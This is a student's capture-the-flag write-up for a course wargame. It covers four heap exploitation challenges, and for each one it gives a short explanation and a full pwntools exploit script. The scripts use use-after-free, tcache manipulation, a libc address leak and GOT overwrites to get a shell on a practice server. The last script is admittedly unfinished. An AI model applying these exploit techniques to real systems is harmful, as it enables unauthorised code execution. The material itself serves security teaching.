z5256275 Lachlan Waugh
==========================================================

usemedontabuseme
==========================================================
Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy11c2VtZWRvbnRhYnVzZW1lIiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiIwZmZkMTIzNi02NGZjLTQyYzYtOTkxZS05ZDUwZTI0ZDM0OTMifQ.Rk7Klo-3-6u9KVs8TLXLci8lAT-azWcYfmozt61XJho}

General overview:
----------------------------------------------------------
1. Use-after free allows for arbitrary memory writes. If you change where the next pointer in a free block is you can change where malloc() will allocate.
2. By writing to an incorrect location you're able to overwrite the pointer to the hint() function in one of the clones to point to win().
3. When invoking the hint it will instead pop the shell.

Script used:
----------------------------------------------------------

```python
#!/usr/bin/env python2

from pwn import *

global p

def make(id, name):
    p.sendlineafter("Choice: ", "a")
    p.sendlineafter("ID: ", id)
    p.sendlineafter("8): ", name)

def kill(id):
    p.sendlineafter("Choice: ", "b")
    p.sendlineafter("ID: ", id)

def edit(id, name):
    p.sendlineafter("Choice: ", "c")
    p.sendlineafter("ID: ", id)
    p.sendlineafter("8): ", name)

def view(id):
    p.sendlineafter("Choice: ", "d")
    p.sendlineafter("ID: ", id)
    p.recvuntil("Name: ")
    return p.recvuntil("-", drop=True)[:4]

def hint(id):
    p.sendlineafter("Choice: ", "h")
    p.sendlineafter("ID: ", id)

p = remote("plsdonthaq.me", 7000)

win = p32(0x08048b7c)

make("0", "abcdef")
make("1", "ABCDEF")
make("2", "123456")

kill("1")
kill("2")
heap = u32(view("2"))

edit("1", p32(heap + 8))

make("3", "abcdef")
make("4", "asdas")
make("5", b"Gd" + "\x00\x00" + win)

hint("4")

p.interactive()

p.close()

```


ezpz1
==========================================================
Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MSIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiZDQ0MTk3NTAtZjRhMi00MzRkLTgzY2YtNzk5ZGMyMWJmOGJlIn0.VLWA8CPJlCywtgQtp670XopDsi-XDA9IXnGamf7nZQE}

General overview:
----------------------------------------------------------
1. The functions don't check whether a question has been freed yet, so you can have two questions pointing to the same memory location.
2. By writing to the location after it has been freed, you can overwrite the question pointer to point to win()

Script used:
----------------------------------------------------------

```python
#!/usr/bin/env python2

from pwn import *

global p

def _create():
    p.sendlineafter("): ", "c")

def _delete(id):
    p.sendlineafter("): ", "d")
    p.sendlineafter("id: ", id)

def _set(id, question):
    p.sendlineafter("): ", "s")
    p.sendlineafter("id: ", id)
    p.sendlineafter("question: ", question)

def _ask(id):
    p.sendlineafter("): ", "a")
    p.sendlineafter("id: ", id)

p = remote("plsdonthaq.me", 7001)

win = p32(0x08048a5c)

# Create a question and delete it
_create()
_delete("0")

# Create another question, it will have the same location as the previous question
# So the "question" will overwrite the address for print_question()
_create()
_set("1", win)

_ask("0")

p.interactive()
p.close()
```


ezpz2
==========================================================
General overview:
----------------------------------------------------------
1. Could write into heap using buffer overflow in set_question() function
2. Leaked the address for puts() in libc by writing it's GOT address into heap buffer and using ask_question() to derefence it.
3. Used the puts() address to find the libc base. Used libc base to find system()
4. Used the print_banner() function (which behaved very similarly to win() from ezpz1) to pop a shell
    * Replaced puts() in GOT with system() from libc
    * Wrote "/bin/sh\x00" to the banner buffer
    * Replaced exit() in GOT with print_banner()
5. After replacing these functions, I just had to invoke exit() (I chose exit() as it wasn't called normally, so I wouldn't have a confusing flow of execution.)

Flag:
----------------------------------------------------------
    FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy1lenB6MiIsImlwIjoiMTAxLjE2NC4zMy4yMTkiLCJzZXNzaW9uIjoiYzcwY2Q2ODAtMDEyZi00ZmZiLTliYmItYWNmZmNhMTljZGQyIn0.cuU8HM08HtQrLuJ2zeT69zz9F9nXrzz8vBXOj23qhoY}

Script used:
----------------------------------------------------------

```python
#!/usr/bin/env python2

from pwn import *

global p

####################################
# HELPER FUNCTIONS FOR THE PROGRAM #
def _create():
    p.sendlineafter("): ", "c")

def _delete(id):
    p.sendlineafter("): ", "d")
    p.sendlineafter("id: ", id)

def _set(id, question):
    p.sendlineafter("): ", "s")
    p.sendlineafter("id: ", id)
    p.sendlineafter("question: ", question)

def _ask(id, flag):
    p.sendlineafter("): ", "a")
    p.sendlineafter("id: ", id)

    # if the flag is set, return the output
    if (not flag): 
        return ""

    p.recvuntil(": '")
    return p.recvuntil("'", drop=True)
####################################

####################################
#                                  #
def _overwrite_size(size):
    payload = b""
    payload += b"\x00" * 0x1C
    payload += size
    payload += b"\x00" * 0x3

    return payload

def _flood_tcache():
    _create()
    _create()
    _create()
    _create()
    _create()
    _create()

    _set("0", _overwrite_size(b"\x01\x01"))

    _delete("0")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("0")
    _delete("1")
    _delete("2")
    _delete("1")
    _delete("0")

def _write_memory(dest, src):
    _set("6", b"\x00" * 0x18 + dest + "\x21" + "\x00" * 3)
    _set("6", p32(leaked - 0x20))

    _set("0", src)
####################################

p = remote("plsdonthaq.me", 7002)

# store entries in the tcache so that new free()s will be stored in the non-fast bins
# this also edits question 1's size to be 101 so that it will be placed in a large bin
_flood_tcache()

# the header for question 1 now stores <main_arena+56> so get the address stored in it's "question"
# and move back the correct offset to find the address storing question 1's prev
leaked = u32(_ask("1", True)) - 0x38

# overwrite question 2's "question" with the memory address
payload = _overwrite_size(b"\x21")
payload += b"\x00" * 0x18
payload += p32(0x0804b02c) # p32(leaked)
_set("1", payload)

# Print out question 2's "question" (which now leaks the memory address for <main_arena>)
leaked2 = u32(_ask("2", True)[:4])

libc   = leaked2 - 0x067b40 # - 0x170BC8 - 0x067c10 + 0x38
system = libc + 0x03d200 # 0x03d250

print_banner = 0x080486dc
banner       = 0x0804b060
puts         = 0x0804b02c
_exit        = 0x0804b014

# Overwrite puts() with system(), banner with 'bin/sh', and exit() with print_banner()
# Therefore when calling exit(), it will invoke puts(banner) (which is system("/bin/sh"))
_create()

_write_memory(p32(_exit), p32(print_banner))
_write_memory(p32(banner), b"/bin/sh\x00")
_write_memory(p32(puts), p32(system))

_ask("99", False)

p.interactive()
```


notezpz
==========================================================
General overview:
----------------------------------------------------------
1. I wasn't able to finish this in time, but I believe that it would follow a similar method to the previous one.
2. I found how to leak the <main_arena> libc function through changing the size of a buffer before it was freed, and then filling up the tcache. From here the backwards pointer pointed to <main_arena+56>.
3. I leaked the backwards pointer by first leaking the address of one of the freed nodes with a use-after free (ask would write the location of the next pointer in a free node)
4. After this I found the offsets of "/bin/sh\x00" and system() from the libc database. So I needed to store these in the buffer used for invoking ask_question()
5. Finally I needed to write these functions into the correct place in the heap buffer, and invoke ask_question(), however I ran out of time.

Flag:
----------------------------------------------------------
    FLAG{}

Script used:
----------------------------------------------------------

```python
    #!/usr/bin/env python2

from pwn import *

global p
global elf

####################################
# HELPER FUNCTIONS FOR THE PROGRAM #
def _start():
    prog  = "./bin/notezpz"
    ip   = "plsdonthaq.me"
    port = 7003

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog,  
                    """
                        c
                    """)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

def _create():
    p.sendlineafter("): ", "c")

def _delete(id):
    p.sendlineafter("): ", "d")
    p.sendlineafter("id: ", id)

def _set(id, question):
    p.sendlineafter("): ", "s")
    p.sendlineafter("id: ", id)
    p.sendlineafter("question: ", question)

def _ask(id, flag):
    p.sendlineafter("): ", "a")
    p.sendlineafter("id: ", id)

    # if the flag is set, return the output
    if (not flag): 
        return ""

    p.recvuntil(": '")
    return p.recvuntil("'", drop=True)
####################################

####################################
#                                  #
def _overwrite_size(size):
    payload = b""
    payload += b"\x00" * 0x1C
    payload += size
    payload += b"\x00" * 0x3

    return payload

def _split_chunk():
    # Split the second question into two smaller chunks with a heap overflow
    payload = b""
    payload += b"\x00" * 0x1C   # padding to change the size of the next buffer
    payload += b"\x11"          # size of the next buffer
    payload += b"\x00" * 0x3    # padding as the set function writes a newline into the buffer

    payload += b"\x00" * 0x1C
    payload += b"\x10"
    payload += b"\x00" * 0x3

def _flood_tcache():
    _create()
    _create()
    _create()
    _create()
    _create()
    _create()

    _set("0", _overwrite_size(b"\x01\x01"))

    _delete("0")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("1")
    _delete("0")
    _delete("1")
    _delete("2")
    _delete("1")
    _delete("0")

def _write_memory(dest, src):
    _set("6", b"\x00" * 0x18 + dest + "\x21" + "\x00" * 3)
    _set("6", p32(leaked - 0x20))

    _set("0", src)
####################################

p = _start()

# store entries in the tcache so that new free()s will be stored in the non-fast bins
# this also edits question 1's size to be 101 so that it will be placed in a large bin
_flood_tcache()

# the header for question 1 now stores <main_arena+56> so get the address stored in it's "question"
# and move back the correct offset to find the address storing question 1's prev
leaked = u32(_ask("1", True)) - 0x38

# overwrite question 2's "question" with the memory address
payload = _overwrite_size(b"\x21")
payload += b"\x00" * 0x18
payload += p32(0x0804b02c) # p32(leaked)
_set("1", payload)

# Print out question 2's "question" (which now leaks the memory address for <main_arena>)
leaked2 = u32(_ask("2", True)[:4])

print(hex(leaked2))
pause()

libc   = leaked2 - 0x067b40 # - 0x170BC8 - 0x067c10 + 0x38
system = libc + 0x03d200 # 0x03d250

print_banner = 0x080486dc
banner       = 0x0804b060
puts         = 0x0804b02c
_exit        = 0x0804b014

# Overwrite puts() with system(), banner with 'bin/sh', and exit() with print_banner()
# Therefore when calling exit(), it will invoke puts(banner) (which is system("/bin/sh"))
_create()

_write_memory(p32(_exit), p32(print_banner))
_write_memory(p32(banner), b"/bin/sh\x00")
_write_memory(p32(puts), p32(system))

#_ask("99", False)

p.interactive()
p.close()
```